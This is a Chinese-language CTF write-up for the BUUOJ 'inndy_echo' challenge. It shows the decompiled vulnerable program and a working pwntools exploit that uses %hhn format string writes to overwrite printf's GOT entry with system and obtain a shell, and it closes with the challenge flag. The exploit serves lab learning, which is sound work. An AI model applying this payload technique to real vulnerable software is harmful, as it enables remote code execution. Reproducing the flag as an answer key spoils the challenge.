# inndy_echo

[题目地址](https://buuoj.cn/challenges#inndy_echo)

借此机会好好学习一下[格式化字符串漏洞](https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/)。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
  unsigned int v4; // [esp+10Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  do
  {
    fgets(s, 256, stdin);
    printf(s);
  }
  while ( strcmp(s, "exit\n") );
  system("echo Goodbye");
  exit(0);
}
```

程序内容仅此而已，有个很明显的格式化字符串漏洞。

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

relro没开全，可以借此改got表。printf不错，参数可控且与system签名差不多。本来想pwntools一键生成的（老脚本小子了），结果发现用不了。我自己又不会写，长期依赖工具导致基本功完全没有。跑去看[wp](https://blog.csdn.net/Y_peak/article/details/115305977)，分析wp的同时恶补基本功。

```python
from pwn import *
p = remote("node4.buuoj.cn",25196)
offest = 7 #这是输入内容相对格式化字符串的偏移。比如输入AAAA,%7$p,程序回显AAAA,0x41414141
printf_got = 0x0804A010
sys = 0x08048400
#%hhn向某个地址写入单字节。%xc打印x个字符，用于强制让程序输出我们想要的字符数，进而写地址
payload = b"%19$hhn%4c%20$hhn%4c%21$hhn%124c%22$hhn" #%19对应下方的printf_got，%20对应下方的printf_got+2，以此类推。%19$hhn表示向%19的位置写入已输出字符数的字节
payload = payload.ljust(0x30, b'a') #做填充。0x30//4=12，加上基础的7偏移就是19，对应printf_got的偏移。这里填充只要保证最终payload是4的整数倍就好，比如b'%18$hhn%4c%19$hhn%4c%20$hhn%124c%21$hhnaaaaa\x10\xa0\x04\x08\x12\xa0\x04\x08\x13\xa0\x04\x08\x11\xa0\x04\x08'这个payload ljust填充44，然后整体偏移往前了一个，也可以
payload += p32(printf_got) + p32(printf_got+2) + p32(printf_got+3) + p32(printf_got+1)
#printf_got=0x10,printf_got+2=0x04,printf_got+3=0x08,printf_got+1=0xA0。利用hhn等改地址时要先写小的再写大的，因为hhn根据已输出的字符向指定地址写字节，先写大的后期小的就写不了了
print(payload)
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
```

## Flag
> flag{fcb757ac-a97a-4c00-bd06-6be168a3c950}